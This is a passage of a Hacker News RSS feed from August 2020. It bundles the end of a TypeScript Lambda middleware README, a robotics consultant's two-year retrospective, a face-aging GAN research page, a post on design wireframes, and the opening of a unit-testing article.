</code></pre></div></div>

<p>The order of composition can be relevant. When using a helper to do the composition, check, in which order the functions
are applied. Most of the time TypeScript should be able to warn you, if the order is wrong.</p>

<p>Imagine middleware as an onion around your function: The outermost middleware will get called first before the handler
starts, and last after the handler finishes or throws an error. In our example above the order in which middleware gets
executed therefore would be:</p>
<div><div><pre><code>someMiddleware
  someOtherMiddleware
    aThirdMiddleware
      the handler
    aThirdMiddleware
  someOtherMiddleware
someMiddleware
</code></pre></div></div>
<p>This means that middleware which transforms the input for the handler will be executed top to bottom, while middleware
that transforms the response will be called bottom to top.</p>

<h2 id="writing-your-own-middleware">Writing your own middleware</h2>

<p>If you want to write your own middleware, check the existing examples and feel free to borrow some of the tests for
inspiration. The general idea for a middleware is the following:</p>
<div><div><pre><code><span>const</span> <span>myMiddleware</span> <span>=</span> <span>(</span><span>optionsForMyMiddleware</span><span>)</span> <span>=&gt;</span> <span>(</span><span>handler</span><span>)</span> <span>=&gt;</span> <span>async</span> <span>(</span><span>event</span><span>,</span> <span>context</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>try</span> <span>{</span>
    <span>const</span> <span>modifiedEvent</span> <span>=</span> <span>doSomethingBeforeCallingTheHandler</span><span>(</span><span>event</span><span>)</span>
    <span>const</span> <span>response</span> <span>=</span> <span>await</span> <span>handler</span><span>(</span><span>modifiedEvent</span><span>,</span> <span>context</span><span>)</span>
    <span>const</span> <span>modifiedResponse</span> <span>=</span> <span>doSomethingAfterCallingTheHandler</span><span>(</span><span>response</span><span>)</span>
    <span>return</span> <span>modifiedResponse</span>
  <span>}</span> <span>catch</span> <span>(</span><span>error</span><span>)</span> <span>{</span>
    <span>const</span> <span>modifiedError</span> <span>=</span> <span>doSomethingInCaseOfAnError</span><span>(</span><span>error</span><span>)</span>
    <span>throw</span> <span>modifiedError</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>
<p>Usually the same middleware should not need to do something before the handler, after the handler and on error.
Creating separated middlewares for these cases keeps them more versatile. But cases that require multiple steps are
supported as well.</p>

<p>Since the middlewares only uses function composition, TypeScript can offer extensive typing support to let you know
how the middleware changed. When adding your own middleware it is recommended to use generics to avoid losing type
information.</p>

<p>Instead of</p>
<div><div><pre><code><span>const</span> <span>bodyParser</span> <span>=</span> <span>()</span> <span>=&gt;</span>
  <span>(</span><span>handler</span><span>:</span> <span>PromiseHandler</span><span>&lt;</span><span>Omit</span><span>&lt;</span><span>APIGatewayProxyEvent</span><span>,</span> <span>body</span><span>&gt;</span> <span>&amp;</span> <span>{</span> <span>body</span><span>:</span> <span>object</span><span>},</span> <span>APIGatewayProxyResult</span><span>&gt;</span><span>):</span> <span>PromiseHandler</span><span>&lt;</span><span>APIGatewayProxyEvent</span><span>,</span> <span>APIGatewayProxyResult</span><span>&gt;</span> <span>=&gt;</span>
  <span>async</span> <span>(</span><span>event</span><span>:</span> <span>E</span><span>,</span> <span>context</span><span>:</span> <span>Context</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>return</span> <span>handler</span><span>({</span> <span>...</span><span>event</span><span>,</span> <span>body</span><span>:</span> <span>JSON</span><span>.</span><span>parse</span><span>(</span><span>event</span><span>.</span><span>body</span><span>)</span> <span>},</span> <span>context</span><span>)</span>
<span>}</span>
</code></pre></div></div>
<p>use</p>
<div><div><pre><code><span>const</span> <span>bodyParser</span> <span>=</span> <span>()</span> <span>=&gt;</span>
  <span>&lt;</span><span>E</span> <span>extends</span> <span>APIGatewayProxyEvent</span><span>&gt;</span><span>(</span><span>handler</span><span>:</span> <span>PromiseHandler</span><span>&lt;</span><span>Omit</span><span>&lt;</span><span>E</span><span>,</span> <span>body</span><span>&gt;</span> <span>&amp;</span> <span>{</span> <span>body</span><span>:</span> <span>object</span><span>},</span> <span>APIGatewayProxyResult</span><span>&gt;</span><span>):</span> <span>PromiseHandler</span><span>&lt;</span><span>E</span><span>,</span> <span>APIGatewayProxyResult</span><span>&gt;</span> <span>=&gt;</span>
  <span>async</span> <span>(</span><span>event</span><span>:</span> <span>E</span><span>,</span> <span>context</span><span>:</span> <span>Context</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>return</span> <span>handler</span><span>({</span> <span>...</span><span>event</span><span>,</span> <span>body</span><span>:</span> <span>JSON</span><span>.</span><span>parse</span><span>(</span><span>event</span><span>.</span><span>body</span><span>)</span> <span>},</span> <span>context</span><span>)</span>
<span>}</span>
</code></pre></div></div>
<p>so that if multiple middlewares change the event, the resulting type will have all changes and not just the latest.</p>

<h2 id="contributing">Contributing</h2>

<p>If you want to contribute to the project, please read our <a href="https://dbartholomae.github.io/lambda-middleware/CONTRIBUTING.md">contributing guidelines</a> first.</p>

      </section>
    </div></div>]]>
            </description>
            <link>https://dbartholomae.github.io/lambda-middleware/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24280237</guid>
            <pubDate>Wed, 26 Aug 2020 08:01:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Thoughts on 2 Years as a Remote Robotics Consultant]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24280204">thread link</a>) | @msadowski
<br/>
August 26, 2020 | https://msadowski.github.io/2-years-remote-consulting/ | <a href="https://web.archive.org/web/*/https://msadowski.github.io/2-years-remote-consulting/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
            <p><img src="https://msadowski.github.io/images/M_consulting_cropped.png" alt="Thoughts on 2 Years as a Remote Robotics Consultant">
              
            </p>
        
      
      <p>It’s that time of year again when I’m thinking back on the journey I set up for myself by deciding to go into Robotics Consulting. This article is a follow up to the blog post I wrote <a href="https://msadowski.github.io/one-year-of-robotics-consulting/">last year</a>. This year, I’ve decided to try and cover the most important aspects of what I’m doing, and how it has been working out for me.</p>

<!-- more -->

<h2 id="the-work-i-had">The work I had</h2>

<p>I’m very grateful for the kind of work that I do - it feels amazing doing what I love and getting paid for it. I would never change my work for anything else. Every single one of my clients has an interesting problem to solve, and I’m yet to get my first negative experience working with someone. Looking back on all my clients, I’ve worked with many interesting people all around the world, mostly helping them to develop software for mobile robots and drones.</p>

<figure>
    <img src="https://msadowski.github.io/images/2_yr_consulting/clients.png" alt="Map with 22 Clients I had all over the world">
    <figcaption>A world map of the 22 clients I've worked with over the past 2 years</figcaption>
</figure>

<figure>
    <img src="https://msadowski.github.io/images/2_yr_consulting/clients_europe.png" alt="Image showing 8 of my clients in Europe">
    <figcaption>My European clients</figcaption>
</figure>

<p>The duration of the projects I take on are between half a day and 2.5 years long. Everything depends on the client and what they require. Most of my projects kick off with a consultation - helping the client to solve a particular problem by sharing my expertise and experience. After this initial phase, some of the clients decide to hire me as a contractor, helping their technical team solve the challenges they face, while others are happy to carry on working by themselves with the advice received.</p>

<p>As a tangent to the consultations, I also help evaluate robotics funding proposals, as a reviewer in EU technological funding projects <a href="http://www.esmera-project.eu/welcome/">ESMERA</a> and <a href="https://trinityrobotics.eu/">TRINITY</a>, making sure your tax euros are spent on truly cutting-edge projects.</p>

<h3 id="putting-myself-in-my-clients-shoes">Putting myself in my clients’ shoes</h3>

<p>Every project I take on, I treat as my own. This results in me trying to solve issues before they happen, and sometimes even pushing back on client’s decisions - “How about we don’t remove this safety feature?”. Another side effect of treating the project as my own is that I put the client first, before my own business interest, meaning I might earn less for the project overall.</p>

<p>As an example, I was hired to test the idea a client had for a robotic project. The idea turned out to be borderline feasible, with currently available technology, but potentially requiring lots of R&amp;D work. If I sold the project as “no problem, it’s totally doable”, I would definitely get more work supporting the R&amp;D work required. By putting the project and client’s interests first, however, we finished the project after the feasibility study, having realised the extent of R&amp;D work needed.</p>

<p>Since terminating such a project before going to an R&amp;D phase is something I would do, I’m content and the client is most likely even more so, since they don’t have to spend lots of money, not understanding the R&amp;D effort required. Instead, they can decide whether to pursue the idea further. If the client does decide to take a risk, they know that I’ll be there, ready to treat their project as my own, and providing honest advice, even if it means I get less work from it.</p>

<h3 id="the-hardware">The hardware</h3>

<p>Working with hardware is one of the most enjoyable parts of my job. This year, I’ve been focusing a lot on RTK solutions (I have one blog post in the works on a neat RTK setup). Also this year, I finally got my hands on a multi-plane LiDAR, something I’ve been very keen on ever since Velodyne revealed their first multi-plane units.</p>

<figure>
    <img src="https://msadowski.github.io/images/2_yr_consulting/hardware.png" alt="Hardware units I've worked with">
    <figcaption> Some of the hardware I've worked with since I started working as a Remote Robotics Consultant</figcaption>
</figure>

<h2 id="the-work-i-did-not-win">The Work I Did Not Win</h2>

<h3 id="the-dream-project">The dream project</h3>

<p>At one point, I was approached by a client who wanted to create a certain type of robot that I’ve always dreamt of working with. The task would require me to liaise with manufacturers and developers to get the robot ready, and enable support for autonomous navigation in various terrain types. In short, a hugely challenging project that would immensely help me grow, whilst being super fun at the same time. When discussing the project in more detail, I noticed that the budget for this client was not an issue - any platform for any price was OK, as long as it met the requirements. However, when asking follow up questions, it became clear that the project target was to equip robots with weapons.</p>

<figure>
<video controls="controls">
    <source src="https://msadowski.github.io/images/2_yr_consulting/bd.mp4" type="video/mp4">
</video>
<figcaption>The kind of project I’m not keen to work on. Source: <a href="https://www.youtube.com/watch?v=y3RIHnK0_NE">Bosstown Dynamics</a> (Corridor Digital)
</figcaption>
</figure>

<p>When I was applying to University, I promised myself I would not work on weapons, even if these projects have a virtually unlimited budget. I figured that even if I was to fold my consultancy, I would rather do that than compromise on my values.</p>

<h3 id="the-bargain">The bargain</h3>

<p>In the two years working as a Robotics Consultant, I’ve noticed a pattern: the more a potential client bargains before starting the job, the more bargaining and complaining will follow, resulting in an unpleasant experience for everyone involved. In the same bucket as bargaining clients are the UpWork projects that want you to create a SLAM library from scratch for a fixed price of $50. These days, I tend to reject these types of clients and contracts straight away, saving everyone’s time.</p>

<h3 id="watch-out-for-the-legal-stuff">Watch out for the legal stuff</h3>

<p>If I’m receiving 25 pages of legal documents to review before engaging with a customer, it’s a  potential red flag. I don’t mind reading legal documents, but I would rather not involve a lawyer before even starting a project. For me, a huge red flag is when a potential client adds a very vaguely described 3-year non-compete clause, covering a whole industry. I find such terms too restrictive and would never take a project on like this, unless the project also paid for a 3 year holiday after wrapping everything up!</p>

<h3 id="the-lack-of-expertise">The lack of expertise</h3>

<p>As much as I would love to know everything about Robotics, it’s not likely to happen anytime soon. I will never take on projects that fall outside of my expertise (for example, algorithms for soft robotics), unless the client is persistent and understands an R&amp;D process. My go-to advice in such cases is that it’s not feasible to pay my high rates for me to catch up on the topic. In a hypothetical situation, if the project falls outside of my expertise, but it’s in an area I’m planning to pursue, I’d offer a very low rate for the project, highlighting that I will need to do some catching up.</p>

<h2 id="remote-robotics">Remote Robotics</h2>

<p>People often ask me how I work on robotics projects remotely (I’ve been doing this since day 1 of my consultancy). When I’m doing some high level work, it’s usually not an issue. It only becomes slightly more problematic with hardware-oriented projects. The options I’ve tested so far are:</p>

<ul>
  <li>For ROS systems, working with bag files, and in the case of drones, working with log files</li>
  <li>Clients shipping the hardware to me</li>
  <li>Travelling to the client’s location</li>
  <li>Remote control</li>
</ul>

<figure>
    <img src="https://msadowski.github.io/images/2_yr_consulting/office.jpg" alt="My office in the times of pandemic">
    <figcaption>Me and my partner's office in the time of the COVID-19 pandemic</figcaption>
</figure>

<p>ROS is absolutely the best thing that happened to people like me - I can easily review things online and even develop software with just <a href="http://wiki.ros.org/rosbag">bagfiles</a>. However, it’s not always feasible to work with bags, especially if you need to do some work related to sensors and actuators. In these cases, clients will often ship their hardware to me, so that I can integrate it locally. A very convenient way to work with clients in this way is to use a temporary import - it saves you the risk of paying taxes and duties for the expensive robotics parts, and as far as I know when doing a temporary import, you can keep the items for up to a year.</p>

<p>Travelling to the client’s location usually results in a couple of days of a hackathon solving issue. I love these, as it allows me to put the faces to Slack usernames, and I like the dynamics of these kinds of projects. On the flip side, the last time I did it, I ended up doing about 60 hours of work in 5 days - not very feasible, especially as you need to rest for a couple of days afterwards, but I would do it again!</p>

<p>Remote control of the client’s desktop is something that I try to avoid as much as possible when working with hardware. I find that not having physical access to the components is often very limiting (“can you please unplug the cable for me?”) and I estimate that in the worst cases, you are 20-40% less productive by working on robotics in this way.</p>

<h2 id="other-thoughts-on-consultancy-and-self-employment">Other Thoughts on Consultancy and Self-Employment</h2>

<h3 id="freedom">Freedom</h3>

<p>Freedom is one of the most important aspects of what I do. If I don’t work with hardware for a project, then I can usually work from whatever place I want. If I have a day when I don’t feel like working, or can’t work, then taking a day off is not an issue. To an extent, I can choose whichever projects to work on (or at least to which I can say “no” to).</p>

<figure>
    <img src="https://msadowski.github.io/images/2_yr_consulting/outdoors.jpg" alt="A mountain view">
    <figcaption>Having a possibility to go out into the mountains in the middle of the week is something I appreciate a lot</figcaption>
</figure>

<p>This freedom, however, comes with a price attached to it - if I’m not working, then I’m not making money. I don’t get bank holidays and if I get sick and can’t work, then I’m not earning either. These are the main reasons why I think working for oneself is not for everybody, especially when having no projects lined up, as it can become quite stressful.</p>

<p>Being self-employed means that you are at the centre of your business. For me, this means that my physical and mental health are my number one priorities. Examples of how I exercise these are:</p>
<ul>
  <li>Three times a week, around 4pm, I do sports (normally, I go to the gym, but during the pandemic, I’ve been going for a run)</li>
  <li>Practising meditation as the first thing I do in the morning</li>
  <li>In case of health issues, I look to fix them without thinking twice about the money (being located in Europe is a huge advantage here as I know no doctor’s visit will ruin me, financially)</li>
</ul>

<h3 id="upwork">Upwork</h3>

<p>Over the past year, most of my work has come from Upwork (you can see my profile <a href="https://www.upwork.com/freelancers/~0196b3ccb97605e632">here</a>). I won’t repeat the things I said <a href="https://msadowski.github.io/one-year-of-robotics-consulting/#upwork">last year</a> - I’ve grown to appreciate the service. I realised that the 20% fee for …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://msadowski.github.io/2-years-remote-consulting/">https://msadowski.github.io/2-years-remote-consulting/</a></em></p>]]>
            </description>
            <link>https://msadowski.github.io/2-years-remote-consulting/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24280204</guid>
            <pubDate>Wed, 26 Aug 2020 07:57:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[High-Resolution Controllable Face Aging with Generative Adversarial Networks]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24280145">thread link</a>) | @Despoisj
<br/>
August 26, 2020 | https://despoisj.github.io/AgingMapGAN/ | <a href="https://web.archive.org/web/*/https://despoisj.github.io/AgingMapGAN/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      <h2 id="agingmapgan-amgan-high-resolution-controllable-face-aging-with-spatially-aware-conditional-gans">AgingMapGAN (AMGAN): High-Resolution Controllable Face Aging with Spatially-Aware Conditional GANs</h2>



<p>
  <img width="40%" src="https://despoisj.github.io/AgingMapGAN/img/loreal_research.png">
</p>

<h2 id="video-summary">Video Summary</h2>
<iframe width="840" height="472.5" src="https://www.youtube.com/embed/HMZiSVKXkWo" frameborder="0" allow="encrypted-media; picture-in-picture" allowfullscreen=""></iframe>

<h2 id="abstract">Abstract</h2>
<p>Existing approaches and datasets for face aging produce results skewed towards the mean, with individual variations and expression wrinkles often invisible or overlooked in favor of global patterns such as the fattening of the face. Moreover, they offer little to no control over the way the faces are aged and can difficultly be scaled to large images, thus preventing their usage in many real-world applications. To address these limitations, we present an approach to change the appearance of a high-resolution image using ethnicity-specific aging information and weak spatial supervision to guide the aging process. We demonstrate the advantage of our proposed method in terms of quality, control, and how it can be used on high-definition images while limiting the computational overhead.</p>

<h3 id="paper--supplementary-materials">Paper &amp; Supplementary Materials</h3>
<div>
    <p><a href="https://arxiv.org/abs/2008.10960" target="_blank">
            <img src="https://despoisj.github.io/AgingMapGAN/img/paper_thumbnail.jpg">
        </a>
    </p>
    <div>
        <p><span>J. Despois, F. Flament, M. Perrot</span><br>
            <span>
                <b>AgingMapGAN (AMGAN): High-Resolution Controllable Face Aging with Spatially-Aware Conditional GANs.</b>
            </span>
            <br>
            <span>ECCV, 2020 (AIM Workshop Oral)</span>
            <span><a href="https://arxiv.org/abs/2008.10960" target="_blank">[arXiv]</a>&nbsp;<a href="https://despoisj.github.io/AgingMapGAN/bibtex.txt" target="_blank">[BibTeX]</a>&nbsp;<a href="https://despoisj.github.io/AgingMapGAN/supplementary_materials.pdf" target="_blank">[Supplementary Materials]</a></span>
        </p>
    </div>
</div>

<h2 id="model">Model</h2>
<p>Our model takes a patch <em>p</em> from the input image <em>I</em>, a target aging map <em>A</em>, and two orthonogal gradient images <em>X</em> and <em>Y</em>. The image patch <em>I<sub>p</sub></em> is then transformed according to the local aging information contained in the map <em>A<sub>p</sub></em>, while the orthogonal gradients <em>X<sub>p</sub></em> and <em>Y<sub>p</sub></em> provide the coordinates of the patch in a fully-convolutional manner. The conditions are injected in the generator via the SPADE block to preserve the spatial information. Finally, the generator uses an attention mechanism to only change relevant parts of the image, thus preserving the clothes, earrings and other facial features unrelated to aging.</p>

<p>
  <img width="70%" src="https://despoisj.github.io/AgingMapGAN/img/model_hd.jpg">
</p>

<h2 id="training">Training</h2>
<p>To train our model, we use four different losses: <em>L<sub>Age</sub></em> to penalize the aging map estimation, <em>L<sub>Loc</sub></em> for the patch localization, <em>L<sub>WGAN</sub></em> for the realism of the generated images, and <em>L<sub>Cyc</sub></em> for the fidelity to the original image.</p>

<p>
  <img width="70%" src="https://despoisj.github.io/AgingMapGAN/img/training_hd.jpg">
</p>

<h2 id="results">Results</h2>
<h3 id="supervised-high-resolution-standardized-dataset">Supervised: High-Resolution Standardized Dataset</h3>
<p>We have labeled 7000 images, using 15 clinical aging signs for each image, in order to build accurate ethnicity-specific aging maps for each individual. On this dataset, our model is able to generate aged and rejuvenated faces with complete control over the localization and amount of aging.</p>

<p>We recommend viewing the videos in full-screen to see the generated HD images (1024px).</p>
<p>
    <video controls="">
      <source src="https://despoisj.github.io/AgingMapGAN/img/cau.mov">
    Your browser does not support the video tag.
    </video>
    <video controls="">
      <source src="https://despoisj.github.io/AgingMapGAN/img/ind.mov">
    Your browser does not support the video tag.
    </video>
    <video controls="">
      <source src="https://despoisj.github.io/AgingMapGAN/img/aam.mov">
    Your browser does not support the video tag.
    </video>
    <video controls="">
      <source src="https://despoisj.github.io/AgingMapGAN/img/chi.mov">
    Your browser does not support the video tag.
    </video>
</p>

<p>We recommend opening the images in a new tab to see the details.</p>
<p>
  <img width="100%" src="https://despoisj.github.io/AgingMapGAN/img/ours_chi1_cropped.jpg">
</p>
<p>
  <img width="100%" src="https://despoisj.github.io/AgingMapGAN/img/ours_cau1_cropped.jpg">
</p>

<h3 id="weakly-supervised-ffhq">Weakly-Supervised: FFHQ</h3>
<p>To train our model on the FFHQ dataset, we have created labels in a weakly-supervised fashion, using regression models trained on our labeled dataset. Despite this and the challenging poses, occlusions and lighting conditions of the dataset, our approach successfully ages and rejuvenates images in high-definition.</p>

<p>We recommend opening the images in a new tab to see the details.</p>
<p>
  <img width="49%" src="https://despoisj.github.io/AgingMapGAN/img/ffhq_cau1.jpg">
  <img width="49%" src="https://despoisj.github.io/AgingMapGAN/img/ffhq_chi1.jpg">
</p>
<p>
  <img width="49%" src="https://despoisj.github.io/AgingMapGAN/img/ffhq_afr1.jpg">
  <img width="49%" src="https://despoisj.github.io/AgingMapGAN/img/ffhq_cau5.jpg">
</p>
<p>
  <img width="49%" src="https://despoisj.github.io/AgingMapGAN/img/ffhq_cau3.jpg">
  <img width="49%" src="https://despoisj.github.io/AgingMapGAN/img/ffhq_afr2.jpg">
</p>

<h3 id="other-works">Other works</h3>
<p>Check out our other paper presented at AIM (ECCV 2020): <a href="https://robinkips.github.io/CA-GAN/" target="_blank">https://robinkips.github.io/CA-GAN/</a></p>


      
    </section></div>]]>
            </description>
            <link>https://despoisj.github.io/AgingMapGAN/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24280145</guid>
            <pubDate>Wed, 26 Aug 2020 07:47:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You shouldn't skimp on your design phase?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24279956">thread link</a>) | @samzer
<br/>
August 26, 2020 | https://blog.saitamasolutions.com/why-you-shouldnt-skimp-on-your-design-phase/ | <a href="https://web.archive.org/web/*/https://blog.saitamasolutions.com/why-you-shouldnt-skimp-on-your-design-phase/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://blog.saitamasolutions.com/content/images/size/w300/2020/08/Screen_Shot_2020-08-21_at_17.10.12-1.png 300w,
                            https://blog.saitamasolutions.com/content/images/size/w600/2020/08/Screen_Shot_2020-08-21_at_17.10.12-1.png 600w,
                            https://blog.saitamasolutions.com/content/images/size/w1000/2020/08/Screen_Shot_2020-08-21_at_17.10.12-1.png 1000w,
                            https://blog.saitamasolutions.com/content/images/size/w2000/2020/08/Screen_Shot_2020-08-21_at_17.10.12-1.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.saitamasolutions.com/content/images/size/w2000/2020/08/Screen_Shot_2020-08-21_at_17.10.12-1.png" alt="Why you shouldn't skimp on your design phase?">
            </figure>

            <section>
                <div>
                    <figure><img src="https://blog.saitamasolutions.com/content/images/2020/08/Untitled.png" alt=""></figure><blockquote>												source:<a href="https://xkcd.com/2021/">https://xkcd.com/2021/</a></blockquote><p>If you are constructing a building, a blueprint of the building is mandatory before laying the foundation. It forms the basis for estimating the resources required, the number of construction workers, the time it will take to complete the construction and a direction that will guide the civil engineers. The same methodology also applies to digital products.</p><p>The design phase of a product is critical, and this phase will affect the resources and duration of the project, which in turn affects the cost involved. Making wrong decisions and assumptions during the design phase can increase the cost incurred significantly because of the rework required.</p><h2 id="what-are-low-fidelity-and-high-fidelity-wireframes">What are low fidelity and high fidelity wireframes?</h2><p>A low fidelity wireframe contains basic visuals and content. It is static and non-interactive. It is easy and quick to create. You don't require expertise, and it can be created quickly.</p><figure><img src="https://blog.saitamasolutions.com/content/images/2020/08/Screen_Shot_2020-08-21_at_15.41.24.png" alt=""></figure><p>A high fidelity wireframe contains advanced visuals with colours, fonts etc. It has complex interactions and looks close to the final design that the developer gets.</p><figure><img src="https://blog.saitamasolutions.com/content/images/2020/08/Screen_Shot_2020-08-21_at_15.53.01-1.png" alt="" srcset="https://blog.saitamasolutions.com/content/images/size/w600/2020/08/Screen_Shot_2020-08-21_at_15.53.01-1.png 600w, https://blog.saitamasolutions.com/content/images/size/w1000/2020/08/Screen_Shot_2020-08-21_at_15.53.01-1.png 1000w, https://blog.saitamasolutions.com/content/images/2020/08/Screen_Shot_2020-08-21_at_15.53.01-1.png 1283w" sizes="(min-width: 720px) 720px"></figure><p>source: <a href="https://bit.ly/3aLNPkr">https://bit.ly/3aLNPkr</a></p><h2 id="why-start-low">Why start low?</h2><p>Low fidelity wireframes are an essential step of the design process and the following are the reasons why -</p><ul><li><strong>Focus on the bigger picture:</strong> Looking at high fidelity wireframes can be distracting as it can take the focus away from the functional aspect of the product and completely miss out on the larger picture of <em>"Is the design in the right direction?"</em></li><li><strong>Avoids confusion:</strong> If the first design seen by a client is a high fidelity design, then it can create confusion because they might think that this is the final design and it is not what they were expecting.</li><li><strong>Stimulates creativity:</strong> The primary purpose of a low fidelity design is to learn from the audience - client and end-users. It helps in receiving feedback that can be used to create new solutions that align closer to what the audience wants. It also enables the client to provide their ideas as low fidelity designs feel less intimidating.</li><li><strong>Rapid prototyping:</strong> One of the most significant advantages of low fidelity design is that anyone in almost no time can create it, and it is also easily discardable. It accelerates the pace of iteration, getting feedback and aligning the product closer to the client's vision and user's need.</li><li><strong>Resource-saving:</strong> It does not take much expertise nor time for someone to do low fidelity design. The best part of going through a proper low fidelity design process is that it reduces the probability of error that can take place in the development cycle. If wrong assumptions are made, and the product has been built halfway, then it can be very costly in terms of money to correct the direction and also time-consuming.</li></ul><h2 id="what-are-the-ups-of-going-high">What are the ups of going high?</h2><ul><li><strong>Validate complex user interactions:</strong> You can observe how the users are interacting with the product and get feedback on the functionality and navigation of the product. This will help in understanding if there are any confusions faced by the users</li><li><strong>Test out the aesthetics:</strong> You can also observe the how the users respond to the aesthetics of the app - layout, spacing, font styles, illustrations etc. - , and how they feel about it.</li><li><strong>Final branding:</strong> Test out whether your product's personality appeals to your target customers</li><li><strong>Designer developer handoff:</strong> Gives a better idea for the developer on how the overall product will look like. Plus from here you can start giving measurements and specs to the developer for each design element.</li><li><strong>Reduce human error:</strong> High Fidelity wireframes helps to test out the user interactions, aesthetics of the screen which in turn reduces human error that can be from assumptions by the designer, communication from the stakeholders or feedback from the users</li></ul><p>For low fidelity design, you can use -</p><p><strong>Paper/whiteboard:</strong> Yep, it can be as simple as sketching it on a paper or whiteboard it out in a meeting room</p><p><strong><a href="https://balsamiq.cloud/">Balsamiq</a>:</strong> It is a popular tool that has been there since 2008, and it provides basic constructs to build your low fidelity designs. You can also collaborate with your team members online.</p><figure><img src="https://blog.saitamasolutions.com/content/images/2020/08/Screen_Shot_2020-08-21_at_17.10.12.png" alt="" srcset="https://blog.saitamasolutions.com/content/images/size/w600/2020/08/Screen_Shot_2020-08-21_at_17.10.12.png 600w, https://blog.saitamasolutions.com/content/images/2020/08/Screen_Shot_2020-08-21_at_17.10.12.png 810w" sizes="(min-width: 720px) 720px"></figure><p><strong><a href="https://miro.com/">Miro</a>:</strong> It is an online collaborative whiteboard that can be used for multiple use cases; one of the use cases is "design" too. It also has the basic design constructs that can be leveraged effectively to create your designs.</p><figure><img src="https://blog.saitamasolutions.com/content/images/2020/08/Screen_Shot_2020-08-21_at_17.16.48-1.png" alt="" srcset="https://blog.saitamasolutions.com/content/images/size/w600/2020/08/Screen_Shot_2020-08-21_at_17.16.48-1.png 600w, https://blog.saitamasolutions.com/content/images/2020/08/Screen_Shot_2020-08-21_at_17.16.48-1.png 692w"></figure><p>For high fidelity design, you can use</p><p><strong><a href="https://www.invisionapp.com/">Invision</a>:</strong> Its a powerful design tool with lots of powerful features and you can use it to create complex interactions</p><figure><img src="https://blog.saitamasolutions.com/content/images/2020/08/Screen_Shot_2020-08-21_at_17.23.30.png" alt="" srcset="https://blog.saitamasolutions.com/content/images/size/w600/2020/08/Screen_Shot_2020-08-21_at_17.23.30.png 600w, https://blog.saitamasolutions.com/content/images/2020/08/Screen_Shot_2020-08-21_at_17.23.30.png 668w"></figure><p><strong><a href="https://www.figma.com/">Figma</a>:</strong> In the past few years, Figma has become a popular choice among designers. It provides a simple interface which can be used to create complex constructs. It has multiplayer editing which is very powerful for collaboration as well as presenting the design to someone</p><figure><img src="https://blog.saitamasolutions.com/content/images/2020/08/Screen_Shot_2020-08-21_at_17.28.22.png" alt="" srcset="https://blog.saitamasolutions.com/content/images/size/w600/2020/08/Screen_Shot_2020-08-21_at_17.28.22.png 600w, https://blog.saitamasolutions.com/content/images/size/w1000/2020/08/Screen_Shot_2020-08-21_at_17.28.22.png 1000w, https://blog.saitamasolutions.com/content/images/size/w1600/2020/08/Screen_Shot_2020-08-21_at_17.28.22.png 1600w, https://blog.saitamasolutions.com/content/images/2020/08/Screen_Shot_2020-08-21_at_17.28.22.png 1642w" sizes="(min-width: 720px) 720px"></figure><p><strong>Honorable mentions:</strong> <a href="https://www.sketch.com/">Sketch</a> and <a href="https://www.adobe.com/in/products/xd.html">AdobeXD</a></p><h2 id="final-thoughts">Final Thoughts</h2><p>If you are the business owner, then skipping the design phase will cost you not only in monetary terms but also your product missing the mark with the target audience.</p><p>If you are the designer, then you might be comfortable in designing high fidelity wireframes rapidly and skipping on the low fidelity wireframes. The goal should not be to showcase your skill and speed but to deliver on the product that resonates with the user.</p><p>If you are the developer, then getting requirement with not much of design effort will increase the development effort in terms of time and redoing requirements multiple times.</p><p>Design is important towards product development, and skimping it will create cost down the line.</p><figure><img src="https://blog.saitamasolutions.com/content/images/2020/08/planning.png" alt=""></figure><p>												source: <a href="https://xkcd.com/1539/" rel="noopener noreferrer">https://xkcd.com/1539/</a></p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.saitamasolutions.com/why-you-shouldnt-skimp-on-your-design-phase/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24279956</guid>
            <pubDate>Wed, 26 Aug 2020 07:10:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unit Testing – The Freedom to Fail]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24279859">thread link</a>) | @fazlerocks
<br/>
August 25, 2020 | https://blog.manivelnagarajan.com/unit-testing-the-freedom-to-fail-cke8l1tw70056ecs1923xcnwf | <a href="https://web.archive.org/web/*/https://blog.manivelnagarajan.com/unit-testing-the-freedom-to-fail-cke8l1tw70056ecs1923xcnwf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1598260527724/vTQ2VswEq.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>In software engineering space, we often face a situation where we developers, demand for full app revamp for numerous reasons. The codebase becomes fragile. More regression bugs popping up after every release. It takes a long time to add new features and even to resolve small bugs. Everyone is afraid of making changes to the giant beast classes. While revamping looks like a viable option in the developer's eyes, the businesses cannot hold on to building new features. Sometimes, it is impossible to afford regressions in the existing features since the customers are already used to the product.</p>
